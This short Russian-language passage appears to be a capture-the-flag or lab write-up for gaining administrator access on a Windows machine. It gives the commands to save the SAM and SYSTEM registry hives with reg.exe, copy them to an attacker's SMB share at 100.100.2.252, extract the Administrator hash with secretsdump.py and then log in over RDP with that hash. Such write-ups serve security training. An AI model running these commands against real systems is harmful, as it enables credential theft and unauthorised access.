Подключается к машине через xfreerdp
Сохраняем кусты реестров sam и system через cmd администратора
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
```
Запускаем на локальной машине smbserver и передаем на свою машину сохраненные кусты реестра
```
move sam.save \\100.100.2.252\tmp
```
С помощью secretsdump.py получаем хеш Администратора
```
secretsdump.py  -system system.save -sam sam.save LOCAL
```
Подключается по rdp к администратору используя ранее полученный хеш и забираем флаг